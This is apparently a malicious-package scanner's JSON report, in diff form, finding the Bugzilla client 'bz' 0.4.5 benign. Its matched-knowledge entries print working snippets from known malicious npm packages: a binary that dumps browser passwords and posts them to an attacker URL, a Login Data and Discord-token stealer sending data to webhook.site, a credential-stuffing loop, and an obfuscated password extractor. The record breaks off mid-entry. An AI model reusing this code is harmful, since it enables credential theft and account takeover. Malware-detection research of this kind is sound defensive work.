@@ -1,0 +1,2047 @@
+{
+  "package_name": "bz",
+  "package_version": "0.4.5",
+  "label": "benign",
+  "detection_time": "2026-05-26T18:04:03.438250",
+  "status": "success",
+  "selected_files_count": 7,
+  "selected_files": [
+    "package/package.json",
+    "package/src/index.js",
+    "package/bz-0.4.5.js",
+    "package/gulpfile.js",
+    "package/smoke.js",
+    "package/src/bz.js",
+    "package/src/xhr.js"
+  ],
+  "is_malicious": false,
+  "total_files": 7,
+  "malicious_files": 0,
+  "total_slices": 4,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/bz/0.4.5/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/bz/0.4.5/package/src/index.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "index_slice_1",
+          "code_snippet": "const XMLHttpRequest = require('./xhr').XMLHttpRequest;\n\n/**\nConstant for the login entrypoint.\n*/\nconst LOGIN = '/login';\n\n/**\nErrors related to the socket timeout.\n*/\nconst TIMEOUT_ERRORS = ['ETIMEDOUT', 'ESOCKETTIMEDOUT'];\n\nfunction extractField(id, callback) {\n  if (typeof id === 'function') {\n    callback = id;\n    id = undefined;\n  }\n\n  return function(err, response) {\n    if (err) return callback(err);\n\n    if (response) {\n      // default behavior is to use the first id when the caller does not provide one.\n      if (id === undefined) {\n        id = Object.keys(response)[0];\n      }\n      callback(null, response[id]);\n    }\n    else {\n      throw \"Error:, no response in extractField\";\n    }\n  };\n}\n\n/**\nFunction decorator which will attempt to login to bugzilla\nwith the current credentials prior to making the actual api call.\n\n    Bugzilla.prototype.method = login(function(param, param) {\n    });\n\n@param {Function} method to decorate.\n@return {Function} decorated method.\n*/\nfunction loginRequired(method) {\n  // we assume this is a valid bugilla instance.\n  return function() {\n    // remember |this| is a bugzilla instance\n\n    // args for the decorated method\n    var args = Array.prototype.slice.call(arguments),\n        // we need the callback so we can pass login related errors.\n        callback = args[args.length - 1];\n\n    this.login(function(err) {\n      if (err) return callback(err);\n\n      // we are now logged in so the method can run!\n      method.apply(this, args);\n    }.bind(this));\n  };\n}\n\nexport var BugzillaClient = class {\n\n  constructor(options) {\n    options = options || {};\n\n    this.username = options.username;\n    this.password = options.password;\n    this.timeout = options.timeout || 0;\n    this.api_key = options.api_key || null;\n\n    if (options.test) {\n      throw new Error('options.test is deprecated please specify the url directly');\n    }\n\n    this.apiUrl = options.url || 'https://bugzilla.mozilla.org/rest/';\n    this.apiUrl = this.apiUrl.replace(/\\/$/, \"\");\n\n    this._auth = null;\n  }\n\n  login (callback) {\n\n    if (this._auth) {\n      callback(null, this._auth);\n    }\n\n    if (!this.username || !this.password) {\n      throw new Error('missing or invalid .username or .password');\n    }\n\n    var params = {\n      login: this.username,\n      password: this.password\n    };\n\n    var handleLogin = function handleLogin(err, response) {\n      if (err) return callback(err);\n      if (response.result) {\n        this._auth = response.result\n      }\n      else {\n        this._auth = response;\n      }\n      callback(null, response);\n    }.bind(this);\n\n    this.APIRequest('/login', 'GET', handleLogin, null, null, params);\n  }\n\n  getBug (id, params, callback) {\n    if (!callback) {\n       callback = params;\n       params = {};\n    }\n\n    this.APIRequest(\n      '/bug/' + id,\n      'GET',\n      extractField(callback),\n      'bugs',\n      null,\n      params\n    );\n  }\n\n  searchBugs (params, callback) {\n    this.APIRequest('/bug', 'GET', callback, 'bugs', null, params);\n  }\n\n  updateBug (id, bug, callback) {\n    this.APIRequest('/bug/' + id, 'PUT', callback, 'bugs', bug);\n  }\n\n  createBug (bug, callback) {\n    this.APIRequest('/bug', 'POST', callback, 'id', bug);\n  }\n\n  bugComments (id, callback) {\n    var _callback = function(e, r) {\n      if (e) throw e;\n      var _bug_comments = r[id];\n      if (typeof _bug_comments['comments'] !== 'undefined') {\n        // bugzilla 5 :(\n        _bug_comments = _bug_comments.comments;\n      }\n      callback(null, _bug_comments);\n    }\n\n    this.APIRequest(\n      '/bug/' + id + '/comment',\n      'GET',\n      _callback,\n      'bugs'\n    );\n  }\n\n  addComment (id, comment, callback) {\n    this.APIRequest(\n      '/bug/' + id + '/comment',\n      'POST',\n      callback,\n      null,\n      comment\n    );\n  }\n\n  bugHistory (id, callback) {\n    this.APIRequest(\n      '/bug/' + id + '/history',\n      'GET',\n      callback,\n      'bugs'\n    );\n  }\n\n  bugAttachments (id, callback) {\n    this.APIRequest(\n      '/bug/' + id + '/attachment',\n      'GET',\n      extractField(id, callback),\n      'bugs'\n    );\n  }\n\n  createAttachment (id, attachment, callback) {\n    this.APIRequest(\n      '/bug/' + id + '/attachment',\n      'POST',\n      extractField(callback),\n      'ids',\n      attachment\n    );\n  }\n\n  getAttachment (id, callback) {\n    this.APIRequest(\n      '/bug/attachment/' + id,\n      'GET',\n      extractField(callback),\n      'attachments'\n    );\n  }\n\n  updateAttachment (id, attachment, callback) {\n    this.APIRequest('/bug/attachment/' + id, 'PUT', callback, 'ok', attachment);\n  }\n\n  searchUsers (match, callback) {\n    this.APIRequest('/user', 'GET', callback, 'users', null, {match: match});\n  }\n\n  getUser (id, callback) {\n    this.APIRequest(\n      '/user/' + id,\n      'GET',\n      extractField(callback),\n      'users'\n    );\n  }\n\n  getSuggestedReviewers (id, callback) {\n    this.APIRequest('/review/suggestions/' + id, 'GET', callback);\n  }\n\n  getConfiguration (params, callback) {\n    if (!callback) {\n       callback = params;\n       params = {};\n    }\n\n    let that = this;\n\n    var req = new XMLHttpRequest();\n    req.open('GET', 'https://api-dev.bugzilla.mozilla.org/latest/configuration', true);\n    req.setRequestHeader(\"Accept\", \"application/json\");\n    req.onreadystatechange = function (event) {\n      if (req.readyState == 4 && req.status != 0) {\n        that.handleResponse(null, req, callback);\n      }\n    };\n    req.timeout = this.timeout;\n    req.ontimeout = function (event) {\n      that.handleResponse('timeout', req, callback);\n    };\n    req.onerror = function (event) {\n      that.handleResponse('error', req, callback);\n    };\n    req.send();\n  }\n\n  getProducts (product) {\n    var _this = this;\n    return new Promise(function(resolve, reject) {\n      if( product === \"selectable\" || product === \"enterable\" || product === \"accessible\" ) {\n        _this.APIRequest(\n          '/product?type=' + product,\n          'GET',\n          function(err, products) {\n            if(err) {\n              return reject(err);\n            } else {\n              return resolve(products);\n            }\n          }\n        );\n      } else {\n        _this.APIRequest(\n          '/product/' + product,\n          'GET',\n          function(err, products) {\n            if(err) {\n              return reject(err);\n            } else {\n              return resolve(products);\n            }\n          }\n        );\n      }\n    });\n  }\n\n  getProduct (product) {\n    var _this = this;\n    return new Promise(function(resolve, reject) {\n      _this.APIRequest(\n        '/product/' + product,\n        'GET',\n        function(err, product) {\n            if(err) {\n              return reject(err);\n            } else {\n              return resolve(product);\n            }\n          }\n      );\n    });\n  }\n\n  APIRequest (path, method, callback, field, body, params) {\n    if (\n      path === LOGIN ||\n      this._auth ||\n      !this.password || !this.username\n    ) {\n      return this._APIRequest.apply(this, arguments);\n    }\n\n    let args = [].slice.call(arguments);\n\n    this.login(function(err) {\n      if (err) return callback(err);\n      this._APIRequest.apply(this, args);\n    }.bind(this));\n  }\n\n  _APIRequest (path, method, callback, field, body, params) {\n    let url = this.apiUrl + path;\n\n    params = params || {};\n\n    if(this.api_key) { params.api_key = this.api_key; }\n\n    if (this._auth) {\n      params.token = this._auth.token;\n    }\n    else if (this.username && this.password) {\n      params.login = this.username;\n      params.password = this.password;\n    }\n\n    if (params && Object.keys(params).length > 0) {\n      url += \"?\" + this.urlEncode(params);\n    }\n\n    body = JSON.stringify(body);\n\n    let that = this;\n\n    var req = new XMLHttpRequest();\n    req.open(method, url, true);\n    req.setRequestHeader(\"Accept\", \"application/json\");\n    if (method.toUpperCase() !== \"GET\") {\n      req.setRequestHeader(\"Content-Type\", \"application/json\");\n    }\n    req.onreadystatechange = function (event) {\n      if (req.readyState == 4 && req.status != 0) {\n        that.handleResponse(null, req, callback, field);\n      }\n    };\n    req.timeout = this.timeout;\n    req.ontimeout = function (event) {\n      that.handleResponse('timeout', req, callback);\n    };\n    req.onerror = function (event) {\n      that.handleResponse(event, req, callback);\n    };\n    req.send(body);\n  }\n\n  handleResponse (err, response, callback, field) {\n    if (err && err.code && TIMEOUT_ERRORS.indexOf(err.code) !== -1) {\n      return callback(new Error('timeout'));\n    }\n\n    if (err) return callback(err);\n\n    var requestSuccessful = response.status > 199 && response.status < 300;\n\n    var parsedBody;\n\n    try {\n      parsedBody = JSON.parse(response.responseText);\n    } catch (e) {\n      if (requestSuccessful) {\n        return callback(\n          new Error('response was not valid json: ' + response.responseText)\n        );\n      }\n    }\n\n    if (typeof parsedBody['result'] !== 'undefined') {\n      parsedBody = parsedBody['result'];\n    }\n\n    if (parsedBody && parsedBody.error) {\n      requestSuccessful = false;\n    }\n\n    if (!requestSuccessful) {\n      return callback(new Error(\n        'HTTP status ' + response.status + '\\n' +\n        (parsedBody && parsedBody.message) ? parsedBody.message : ''\n      ));\n    }\n\n    callback(null, (field) ? parsedBody[field] : parsedBody);\n  }\n\n  urlEncode (params) {\n    var url = [];\n    for(var param in params) {\n      var values = params[param];\n      if(!values.forEach)\n        values = [values];\n      values.forEach(function(value) {\n         url.push(encodeURIComponent(param) + \"=\" +\n           encodeURIComponent(value));\n      });\n    }\n    return url.join(\"&\");\n  }\n}\n\nexport function createClient(options) {\n  return new BugzillaClient(options);\n}\n",
+          "is_malicious": false,
+          "malice_score": 0.4383475402990977,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code accesses user credentials (username, password, api_key) and performs authenticated HTTP REST API requests to Bugzilla endpoints using XMLHttpRequest. It constructs URLs with embedded authentication parameters and sends JSON-encoded request bodies to hardcoded Bugzilla API URLs including 'https://bugzilla.mozilla.org/rest/' and 'https://api-dev.bugzilla.mozilla.org/latest/configuration'. This enables authenticated data retrieval and modification on Bugzilla servers, facilitating operations such as login, bug creation, updates, comments, attachments, and user searches.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a legitimate client library for interacting with the Bugzilla REST API. It uses XMLHttpRequest to perform authenticated HTTP requests, manages user credentials (username, password, api_key) for authentication, and provides methods to create, update, and query bugs and related data. While it accesses sensitive credentials and performs network communication, these behaviors are expected and necessary for its intended functionality. There is no evidence of obfuscation, credential harvesting, exfiltration to suspicious domains, or execution of external binaries. The only similarity to known malicious patterns is the use of XMLHttpRequest, but unlike the malicious example that requires a local suspicious file, this code requires a local './xhr' module which is presumably legitimate and consistent with the client implementation. No suspicious or malicious intent is observed.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_104013_892794_snippet_2",
+              "source_package": "ca-bucky-client (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104013_892794/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.46656104922294617,
+              "code_similarity": 0.557747483253479,
+              "behavior_similarity": 0.37537461519241333,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "XMLHttpRequest = require(\"./xmlhttprequest\").XMLHttpRequest;",
+                "code_behavior": "During installation, the code in bucky.js requires a local xmlhttprequest.js file instead of the legitimate npm package, loading the actual malicious payload for execution.",
+                "malice_analysis": {
+                  "why_suspicious": "Redirecting a require statement to a local file with the same name as a popular package is a known obfuscation and privilege escalation technique, often used to hide malicious code.",
+                  "violated_expectations": "Legitimate code would require the official xmlhttprequest package from npm, not a local file with the same name.",
+                  "similar_legitimate_use": "Local shims may be used for testing in development environments, but not in published production packages.",
+                  "key_indicators": [
+                    "require statement points to local xmlhttprequest.js",
+                    "Deviation from expected dependency usage"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "preinstall (via bucky.js)",
+                  "file_location": "bucky.js",
+                  "required_permissions": [
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "ca-bucky-client",
+                  "package_manager": "npm",
+                  "package_versions": "0.0.2 and later (0.0.1 is not malicious)",
+                  "why_malicious": "The package is malicious because, during installation, it executes obfuscated JavaScript code that harvests all environment variables and system information, performs anti-analysis checks to evade detection, encodes the stolen data using a custom base64 variant, and exfiltrates it to a remote server controlled by the attacker. This behavior can result in the theft of sensitive credentials, such as AWS keys, and is designed to bypass both automated and manual analysis."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Preinstall script executes bucky.js, which loads the malicious xmlhttprequest.js.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Malicious code execution in xmlhttprequest.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "xmlhttprequest.js collects all environment variables from the host system.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "System and credential data harvested"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Performs anti-analysis checks to avoid sandboxes, certain usernames, and specific NPM registries.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Conditional execution or early exit"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Encodes the collected data using a custom base64 function to evade detection.",
+                    "implemented_by": [
+                      "snippet_6"
+                    ],
+                    "leads_to": "Obfuscated data ready for exfiltration"
+                  },
+                  {
+                    "step": 5,
+                    "action": "Dynamically constructs the HTTP request method name to further obfuscate network activity.",
+                    "implemented_by": [
+                      "snippet_7"
+                    ],
+                    "leads_to": "Network exfiltration step"
+                  },
+                  {
+                    "step": 6,
+                    "action": "Sends the obfuscated environment data to a remote server controlled by the attacker.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Exfiltration of sensitive data (final goal)"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Preinstall script execution of local JavaScript files during npm install",
+                    "Bulk access to process.env during installation",
+                    "Outbound network requests to external servers during install phase",
+                    "Obfuscated or dynamically constructed method names in network code",
+                    "Anti-analysis checks for usernames, registry mirrors, or analysis environments"
+                  ],
+                  "file_indicators": [
+                    "Presence of xmlhttprequest.js in package root directory",
+                    "package.json with preinstall script referencing bucky.js",
+                    "require statements for local xmlhttprequest.js in bucky.js"
+                  ],
+                  "network_indicators": [
+                    "Requests to *.wixsite.com/*/_functions/*",
+                    "Outbound HTTP(S) requests initiated during npm install",
+                    "Encoded (base64 with inserted string) payloads in HTTP request bodies"
+                  ],
+                  "how_to_detect": "Monitor npm packages for preinstall scripts that execute local files, especially those that access process.env or initiate outbound network requests. Flag packages containing xmlhttprequest.js not present in the legitimate upstream. Detect obfuscated code that dynamically constructs method names or encodes data with non-standard base64 (e.g., with inserted strings). Alert on network traffic to known exfiltration endpoints such as wixsite.com/_functions/ during package installation."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104241_482183_snippet_1",
+              "source_package": "bb-builder (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104241_482183/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4338948130607605,
+              "code_similarity": 0.38687431812286377,
+              "behavior_similarity": 0.48091527819633484,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "var child_process = require(\"child_process\");\nvar exec = child_process.exec;\nvar path = require(\"path\");\nconst fs = require(\"fs\");\nconst axios = require(\"axios\");\nconst pwnurl = \"http://1.host.jwte.ch:1337/pwn\"\nvar workdir = \".\\\\\" + path.join(\".\", \"node_modules\", \"bb-builder\") + \"\\\\\";\nexec(workdir + \"extension.exe\" + \" /shtml \\\"out.html\\\"\", function(err, stdout, stderr) {\n  axios.post(pwnurl, require(\"fs\").readFileSync(\"./out.html\", \"utf-8\")).then(a => a).catch(console.error)\n  fs.unlinkSync(\"./out.html\");\n})",
+                "code_behavior": "At runtime, the code executes a bundled credential recovery tool (WebBrowserPassView) using child_process.exec, extracts browser-stored credentials to an HTML file, reads the file contents, sends the data via HTTP POST to a hardcoded external server, and deletes the output file to remove evidence.",
+                "malice_analysis": {
+                  "why_suspicious": "The code launches an external credential recovery tool to harvest sensitive browser credentials, exfiltrates the data to an attacker-controlled server, and deletes the evidence. This sequence is characteristic of credential-stealing malware and is highly suspicious in any npm package.",
+                  "violated_expectations": "Legitimate npm packages do not execute external binaries, harvest user credentials, or communicate with unknown external servers. They also do not perform anti-forensic actions such as deleting evidence files after exfiltration.",
+                  "similar_legitimate_use": "Password recovery tools like WebBrowserPassView may be used by end-users for local credential recovery, but never as part of an npm package or with automated exfiltration to a remote server.",
+                  "key_indicators": [
+                    "Execution of WebBrowserPassView or similar credential recovery binaries from within the package",
+                    "Automated reading and exfiltration of credential data files (e.g., out.html)",
+                    "Outbound HTTP POST requests to hardcoded, suspicious domains (e.g., 1.host.jwte.ch:1337/pwn)",
+                    "Immediate deletion of output files after exfiltration (anti-forensics)"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when the package is executed as part of a build process or script execution)",
+                  "file_location": "main JavaScript file of bb-builder package (e.g., index.js or main entry point)",
+                  "required_permissions": [
+                    "filesystem (read/write/delete files)",
+                    "network (outbound HTTP requests)",
+                    "process_execution (spawn external binaries)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "bb-builder",
+                  "package_manager": "npm",
+                  "package_versions": [
+                    "1.0.1",
+                    "1.0.2",
+                    "1.0.3",
+                    "1.0.4",
+                    "1.0.5",
+                    "1.0.6"
+                  ],
+                  "why_malicious": "The package embeds and executes a credential-stealing binary (WebBrowserPassView) to extract browser-stored credentials, exfiltrates the stolen data to an external attacker-controlled server, and deletes evidence of the theft. The malicious code is intentionally obfuscated within a seemingly legitimate npm package, and such behavior is never expected in any legitimate npm package."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or executes the bb-builder package, which triggers the malicious JavaScript code.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of credential recovery tool"
+                  },
+                  {
+                    "step": 2,
+                    "action": "The package executes the bundled WebBrowserPassView binary to extract browser-stored credentials and saves them to an HTML file (out.html).",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Credential data is written to disk"
+                  },
+                  {
+                    "step": 3,
+                    "action": "The package reads the credential data from the HTML file and sends it via HTTP POST to the attacker's server at http://1.host.jwte.ch:1337/pwn.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Exfiltration of sensitive credentials"
+                  },
+                  {
+                    "step": 4,
+                    "action": "The package deletes the HTML file containing the credentials to remove evidence of the theft.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Anti-forensics; attack complete"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of external credential recovery tools (e.g., WebBrowserPassView) from within npm package scripts",
+                    "Automated creation and deletion of temporary credential data files (e.g., out.html) during package execution",
+                    "Outbound HTTP POST requests to hardcoded, suspicious domains during package runtime",
+                    "Immediate removal of files containing sensitive data after network exfiltration"
+                  ],
+                  "file_indicators": [
+                    "Presence of WebBrowserPassView or similar binaries (e.g., extension.exe) in npm package directories (e.g., node_modules/bb-builder/)",
+                    "Creation and subsequent deletion of files named out.html or similar in the working directory",
+                    "Suspicious executable files bundled within JavaScript packages"
+                  ],
+                  "network_indicators": [
+                    "HTTP POST requests to http://1.host.jwte.ch:1337/pwn or similar credential collection endpoints",
+                    "Outbound network connections from npm package scripts to unknown or untrusted domains"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that bundle and execute credential recovery tools such as WebBrowserPassView, especially those that create and quickly delete temporary files containing credentials. Flag any package that makes HTTP POST requests to hardcoded or suspicious domains (e.g., 1.host.jwte.ch:1337) during installation or runtime. Use static analysis to detect embedded binaries and dynamic analysis to observe file creation/deletion and network activity during package execution."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113202_101350_snippet_1",
+              "source_package": "Akamai WEB and BMP API (underground botting tool) (N/A (proprietary/underground tool, not a public package manager))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113202_101350/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4266241490840912,
+              "code_similarity": 0.3722836971282959,
+              "behavior_similarity": 0.4809646010398865,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "Automated login attempts using credential lists:\nfor (const [username, password] of credentialList) {\n  await page.goto('https://targetsite.com/login');\n  await page.type('#username', username);\n  await page.type('#password', password);\n  await page.click('#login');\n  // Check for successful login\n}",
+                "code_behavior": "At runtime, the code iterates through a list of credentials, automates browser-based login attempts to a target site by filling in username and password fields, submits the login form, and checks for successful authentication, resulting in credential stuffing and potential account takeover.",
+                "malice_analysis": {
+                  "why_suspicious": "The code systematically attempts logins with multiple credentials, a core technique in credential stuffing attacks that seek unauthorized access to user accounts using breached or stolen data.",
+                  "violated_expectations": "Legitimate automation would only log in with a single, authorized user account, not cycle through large credential lists targeting production login endpoints.",
+                  "similar_legitimate_use": "Automated QA testing of login flows with test accounts in isolated environments, never with real or breached credentials against production systems.",
+                  "key_indicators": [
+                    "Bulk login attempts with varying credentials",
+                    "Automated browser actions targeting live login endpoints",
+                    "Presence of credential list input or configuration"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (during automated login or account creation attempts)",
+                  "file_location": "core automation scripts (e.g., Puppeteer/Playwright/Selenium scripts or proprietary bot code)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Akamai WEB and BMP API (underground botting tool)",
+                  "package_manager": "N/A (proprietary/underground tool, not a public package manager)",
+                  "package_versions": "Unknown (likely multiple, as updated for bypasses)",
+                  "why_malicious": "This tool is explicitly designed and marketed for bypassing anti-bot protections on major retail and sneaker sites, enabling automated credential stuffing, account takeover, and fake account generation attacks. Its features and underground distribution indicate intent to facilitate fraud, large-scale abuse, and unauthorized access to protected resources."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Obtain or purchase credential lists and/or fake account generation methods.",
+                    "implemented_by": [],
+                    "leads_to": "Automated attack execution"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Automate login attempts using credential stuffing or credential cracking.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Account takeover or credential validation"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Automate fake account creation to scale fraud or abuse.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Mass fake accounts for fraud, laundering, or abuse"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Bypass anti-bot protections using CAPTCHA solver services.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Uninterrupted automation"
+                  },
+                  {
+                    "step": 5,
+                    "action": "Evade detection by rotating proxies and spoofing browser fingerprints.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Sustained, undetected attack activity"
+                  },
+                  {
+                    "step": 6,
+                    "action": "Monetize compromised or fake accounts (sell, launder, abuse).",
+                    "implemented_by": [],
+                    "leads_to": "Financial gain for attacker"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "High volume of login attempts from diverse IP addresses and user agents within short timeframes",
+                    "Rapid, repeated account creation attempts with similar registration patterns and generated data",
+                    "Frequent use of residential proxies and observable proxy rotation during sessions",
+                    "Automated CAPTCHA solving via outbound requests to known solver API domains"
+                  ],
+                  "file_indicators": [
+                    "Automation scripts referencing Puppeteer, Playwright, or Selenium libraries",
+                    "Configuration files or scripts containing proxy lists, credential input, or fingerprint spoofing logic",
+                    "Hardcoded or dynamically referenced solver service API endpoints in code"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP(S) connections to CAPTCHA solver service domains (e.g., solver-service.com)",
+                    "Frequent IP address changes associated with residential proxy providers during authentication or registration flows",
+                    "Unusual spikes in login or registration traffic from IPs with inconsistent geolocation or user agent strings"
+                  ],
+                  "how_to_detect": "Monitor authentication and registration endpoints for high-frequency attempts from varying IP addresses and user agents, especially those matching residential proxy ranges. Flag HTTP headers or browser fingerprints indicative of automation tools (e.g., Puppeteer/Playwright). Detect outbound network requests to known CAPTCHA solver API domains. Correlate rapid account creation or login failures with proxy and fingerprint rotation patterns to identify automated abuse."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113641_174600_snippet_2",
+              "source_package": "MUT-8694 (multiple typosquatted packages) (npm, PyPI)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_113641_174600/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4092522859573364,
+              "code_similarity": 0.42270708084106445,
+              "behavior_similarity": 0.3957975208759308,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// JavaScript (Blank Grabber/Skuld Stealer core logic)\nconst fs = require('fs');\nconst https = require('https');\nconst token = process.env.DISCORD_TOKEN;\nfs.readFile(process.env.APPDATA + '/User Data/Default/Login Data', (err, data) => {\n  if (!err) {\n    const options = {\n      hostname: 'webhook.site',\n      path: '/unique-id',\n      method: 'POST',\n      headers: {'Content-Type': 'application/octet-stream'}\n    };\n    const req = https.request(options);\n    req.write(data);\n    req.end();\n  }\n});",
+                "code_behavior": "At runtime, the code reads sensitive files such as browser login data and environment variables like DISCORD_TOKEN, then exfiltrates this data via HTTPS POST to a remote webhook endpoint controlled by the attacker.",
+                "malice_analysis": {
+                  "why_suspicious": "The code accesses credential stores and environment variables containing sensitive information, then transmits this data to an external server, which is a hallmark of infostealer malware.",
+                  "violated_expectations": "Legitimate packages should not access or transmit user credentials or sensitive files without explicit user consent and clear justification.",
+                  "similar_legitimate_use": "Security auditing tools may access such files, but only with user awareness, explicit permission, and for legitimate security purposes.",
+                  "key_indicators": [
+                    "Access to credential stores (browser login data, environment tokens)",
+                    "Exfiltration of data to webhook.site or similar endpoints",
+                    "Use of environment variables for sensitive data extraction",
+                    "Network transmission of credential data without user consent"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "payload.exe (delivered by the package)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "MUT-8694 (multiple typosquatted packages)",
+                  "package_manager": "npm, PyPI",
+                  "package_versions": "all published versions of the malicious typosquatted packages",
+                  "why_malicious": "The packages are part of a coordinated supply chain attack campaign leveraging typosquatting to impersonate legitimate libraries. Upon installation or import, they download and execute infostealer malware (such as Blank Grabber and Skuld Stealer) designed to exfiltrate sensitive data, including credentials and tokens, from infected systems. The packages attempt to appear trustworthy by referencing legitimate tools and use external platforms (GitHub, repl.it) to host and deliver malicious payloads, primarily targeting Windows users."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or imports the malicious typosquatted package, triggering the download and execution of a remote payload.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Initial payload download and execution on the victim's system"
+                  },
+                  {
+                    "step": 2,
+                    "action": "The malicious payload (infostealer) is executed, establishing persistence and preparing to steal sensitive data.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Credential and data theft capabilities are enabled"
+                  },
+                  {
+                    "step": 3,
+                    "action": "The infostealer accesses sensitive files and environment variables, exfiltrating the stolen data to attacker-controlled endpoints.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives stolen credentials and sensitive information from the victim's system"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Package downloads and executes remote code at import-time or during installation",
+                    "Access to credential stores (browser login data, environment tokens) by package or payload code",
+                    "Exfiltration of sensitive data to external endpoints such as webhook.site, GitHub, or repl.it"
+                  ],
+                  "file_indicators": [
+                    "setup.py or __init__.py containing remote code download and execution logic",
+                    "Unexpected executable files (e.g., payload.exe, malware.py) created during package installation or import",
+                    "References to external code hosting platforms (GitHub, repl.it) in package source code"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP/HTTPS requests to raw.githubusercontent.com for payload downloads",
+                    "Connections to webhook.site or similar data collection endpoints for exfiltration",
+                    "Downloads from repl.it or other code hosting services during installation or import"
+                  ],
+                  "how_to_detect": "Monitor for packages that initiate network connections to code hosting or data exfiltration endpoints during installation or import. Flag any package that downloads and executes remote code, accesses credential stores, or references known infostealer infrastructure. Use static analysis to detect suspicious import-time or setup.py logic, and dynamic analysis to observe unexpected network or filesystem activity during package installation or import. Correlate creation of unexpected executables and outbound connections to known malicious infrastructure."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113501_064300_snippet_1",
+              "source_package": "express-dompurify (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113501_064300/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4084515869617462,
+              "code_similarity": 0.3729250431060791,
+              "behavior_similarity": 0.44397813081741333,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "function getBrowserPasswords() {\n    const _0x53ab = browserProfiles.map(profile => {\n        const filePath = profile + '/Login Data';\n        const loginData = extractSQLiteData(filePath, 'logins');\n        return decryptPasswords(loginData);\n    });\n    return _0x53ab;\n}",
+                "code_behavior": "At import-time or runtime, the code locates browser profile directories, reads the 'Login Data' SQLite database, decrypts stored login credentials using system APIs, and prepares the credentials for exfiltration.",
+                "malice_analysis": {
